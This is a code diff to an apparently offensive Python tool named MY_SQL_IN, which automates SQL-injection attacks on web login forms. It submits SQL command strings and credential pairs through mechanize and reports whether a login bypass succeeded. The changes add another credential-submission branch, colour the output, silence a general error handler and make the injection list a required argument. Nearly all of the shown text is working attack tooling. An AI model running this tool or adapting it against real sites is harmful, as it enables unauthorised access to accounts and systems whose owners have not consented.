@@ -42,7 +42,6 @@ class MY_SQL_IN:
                  request.set_handle_refresh(True, max_time=1)
                  request.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
                  Get_Oregnal_URL = request.open(url).read()   
-                 
                  def Command_Exe() :                      
                      if not self.args.user and not self.args.password and not self.args.PassForm and not self.args.UserForm\
                      and not self.args.UserInput and not self.args.PassInput:
@@ -106,12 +105,47 @@ class MY_SQL_IN:
                        request[f'{self.args.PassForm}']=f'{command}'  
                      elif self.args.UserForm and self.args.PassForm and   self.args.password  and   self.args.user\
                      and self.args.UserInput and self.args.PassInput:
-                       request['username']=f'{self.args.user}'
-                       request[f'{self.args.PassForm}']=f'{self.args.password}'    
-              
+                         request['username']=f'{self.args.user}'
+                         request[f'{self.args.PassForm}']=f'{self.args.password}'                         
+                         response   = request.submit()
+                         content    = response.read()
+                         passlogin  = response.geturl() 
+                         Get_URL_Content = request.open(passlogin).read()                        
+                         if  Get_URL_Content == Get_Oregnal_URL  :
+                               print(B+'[*] '+R+'Login Page  URL   :'+B,url+W )                    
+                               print(B+'[+] '+R+'username          : '+Y+f'{self.args.user}')
+                               print(B+'[+] '+R+'password          : '+Y+f'{self.args.password}') 
+                               print(B+'[*] '+R+'Status            : '+Y+'NOT LOGIN'+W)
+                               exit()
+                         else:
+                               print(B+'[*] '+R+'Login Page  URL   :'+B,passlogin +W )                    
+                               print(B+'[+] '+R+'username          : '+Y+f'{self.args.user}')
+                               print(B+'[+] '+R+'password          : '+Y+f'{self.args.password}') 
+                               print(B+'[*] '+R+'Status            : '+Y+'LOGIN'+W)
+                               exit()         
+                     elif  not self.args.UserForm and not self.args.PassForm and self.args.password  and  self.args.user\
+                     and self.args.UserInput and self.args.PassInput:
+                         request['username']=f'{self.args.user}'
+                         request['password']=f'{self.args.password}'    
+                         response   = request.submit()
+                         content    = response.read()
+                         passlogin  = response.geturl() 
+                         Get_URL_Content = request.open(passlogin).read()                        
+                         if  Get_URL_Content == Get_Oregnal_URL  :
+                               print(B+'[*] '+R+'Login Page  URL   :'+B,url+W )                    
+                               print(B+'[+] '+R+'username          : '+Y+f'{self.args.user}')
+                               print(B+'[+] '+R+'password          : '+Y+f'{self.args.password}') 
+                               print(B+'[*] '+R+'Status            : '+Y+'NOT LOGIN'+W)
+                               exit()
+                         else:
+                               print(B+'[*] '+R+'Login Page  URL   :'+B,passlogin +W )                    
+                               print(B+'[+] '+R+'username          : '+Y+f'{self.args.user}')
+                               print(B+'[+] '+R+'password          : '+Y+f'{self.args.password}') 
+                               print(B+'[*] '+R+'Status            : '+Y+'LOGIN'+W)
+                               exit()      
                      else:
-                       print('[!] Command Not Found')
-                       print('[!] Plases see the help options to how to use ')
+                       print(B+'[!] '+R+'Command Not Found'+W)
+                       print(B+'[!] '+R+'Plases see the help options to how to use '+W)
                        exit()       
                  try:             
                     request.select_form(nr = 0)
@@ -133,7 +167,7 @@ class MY_SQL_IN:
                                       request.select_form(nr = 4)
                                       Command_Exe()
                                     except Exception :    
-                                        print("[!] NO Form HTML Login Found  ")
+                                        print(B+"[!] "+R+"NO Form HTML Login Found  "+W)
                                         exit()                     
                  response   = request.submit()
                  content    = response.read()
@@ -220,7 +254,13 @@ class MY_SQL_IN:
                       elif self.args.UserForm and self.args.PassForm and   self.args.password  and   self.args.user\
                       and self.args.UserInput and self.args.PassInput:     
                            print(B+'[+] '+R+'username['+P+'{:<6}'.format(self.args.UserForm)+R+'] : '+Y+f'{self.args.user}')
-                           print(B+'[+] '+R+'password['+P+'{:<6}'.format(self.args.PassForm)+R+'] : '+Y+f'{self.args.password}')                       
+                           print(B+'[+] '+R+'password['+P+'{:<6}'.format(self.args.PassForm)+R+'] : '+Y+f'{self.args.password}')       
+                      elif  not self.args.UserForm and not self.args.PassForm and self.args.password  and  self.args.user\
+                      and self.args.UserInput and self.args.PassInput:   
+                           print(B+'[+] '+R+'username : '+Y+f'{self.args.user}')
+                           print(B+'[+] '+R+'password : '+Y+f'{self.args.password}')   
+                      
+                                               
                       exit()
                          
              print(B+'[!] '+R+'Web May Not Vulnerable To SQL Injaction '+W)
@@ -228,8 +268,8 @@ class MY_SQL_IN:
          except urllib.error.URLError:
                  print(B+"[*] "+R+"Bad URL Connection refused"+W)
                  exit()
-         except Exception as a :
-                print( B+"[#] "+R+"Error : "+Y+str(a)+W )
+         #except Exception as a :
+          #      print( B+"[#] "+R+"Error : "+Y+str(a)+W )
          except KeyboardInterrupt:
               exit()
        
@@ -238,7 +278,7 @@ class MY_SQL_IN:
         print(B+"")
         parser = argparse.ArgumentParser(description="Usage: [OPtion] [arguments] [ -w ] [arguments]")      
         parser.add_argument("-u",'--URL'        , action=None    ,help ="target url loign page") 
-        parser.add_argument("-c","--Code"       , action=None    ,help ="the List of SQL Commands") 
+        parser.add_argument("-c","--Code"       , action=None   ,required=True,help ="the List of SQL Commands") 
         parser.add_argument("-UF","--UserForm"  , action=None    ,help =" add name of the HTML Form Login User")
         parser.add_argument("-PF","--PassForm"  , action=None    ,help ="add name of the HTML Form Login Passord")
         parser.add_argument("-PI","--PassInput" , action='store_true'    ,help ="use to Post in Password field")
